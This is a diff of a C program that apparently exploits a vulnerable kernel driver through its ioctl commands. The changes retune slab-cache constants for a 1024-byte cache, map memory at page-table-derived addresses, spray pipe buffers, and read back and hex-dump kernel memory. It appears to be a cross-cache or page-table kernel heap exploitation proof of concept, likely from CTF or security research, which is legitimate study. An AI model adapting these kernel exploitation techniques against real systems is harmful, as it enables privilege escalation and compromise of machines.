@@ -14,7 +14,7 @@
 #define IOCTL_CMD_READ 0x812
 #define IOCTL_CMD_WRITE 0x813
 #define IOCTL_CMD_PAGE 0x814
-#define MSG_SZ 256
+#define MSG_SZ 1024
 
 #define N_PTE 0x8
 
@@ -23,9 +23,9 @@ struct user_req {
     char *userland_buf;
 };
 
-#define OBJECT_SIZE 256
-#define OBJS_PER_SLAB 16
-#define CPU_PARTIAL 52
+#define OBJECT_SIZE 1024
+#define OBJS_PER_SLAB 8 
+#define CPU_PARTIAL 24
 
 void ioctl_alloc(int fd, int i) {
     struct user_req req = {
@@ -46,9 +46,10 @@ void ioctl_free(int fd, int i) {
 }
 
 int main(void) {
-    info("kmemcache-256");
+    info("kmemcache-1024");
 
-    size_t size = 2*1024*1024;
+    //size_t size = 4*1024*1024;
+    size_t size = PAGE_SZ;
     hl(size)
 
     void *pte_setup = SYSCHK(mmap(PTI_TO_VIRT(0x1, 0x0, 0x0, 0x0, 0x0), size,
@@ -103,14 +104,11 @@ int main(void) {
         .userland_buf = buf,
     };
 
-
-    void *pte_new = SYSCHK(mmap(PTI_TO_VIRT(0x1, 0x0, 0x80, 0x0, 0x0), size,
-                         PROT_READ | PROT_WRITE, MAP_PRIVATE | 0x20 | MAP_FIXED, -1, 0));
-    hl(pte_new)
-    for (size_t i = 0; i < size; i += 4096) {
-        *((char*)pte_new + i) = 1;
+    #define N_PIPE 0x80
+    int **pipe_ptrs = alloc_pipe(N_PIPE);
+    rep(i,N_PIPE) {
+        pipe_write(pipe_ptrs[i],"A",1);
     }
-
     SYSCHK(ioctl(fd,IOCTL_CMD_READ,&read));
     xxd_qword(buf,sizeof(buf));
     SYSCHK(ioctl(fd,IOCTL_CMD_PAGE,&read));
